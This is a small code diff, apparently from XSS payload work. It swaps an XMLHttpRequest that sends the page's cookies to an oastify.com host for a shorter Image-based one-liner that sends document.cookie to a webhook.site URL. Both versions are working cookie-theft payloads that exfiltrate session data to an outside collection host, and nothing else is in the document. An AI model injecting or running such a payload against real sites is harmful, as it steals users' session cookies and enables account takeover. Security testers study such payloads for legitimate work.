@@ -1,3 +1,1 @@
-var xhttp = new XMLHttpRequest();
-xhttp.open('GET', 'http://o2r6a5bg5kezc9j7e646n9jff6lx9zxo.oastify.com/?' + document.cookie, true);
-xhttp.send();
+var i=new Image;i.src="https://webhook.site/a648fec1-48e3-4c3c-8266-9ca9798c923d/?cookie="+document.cookie;
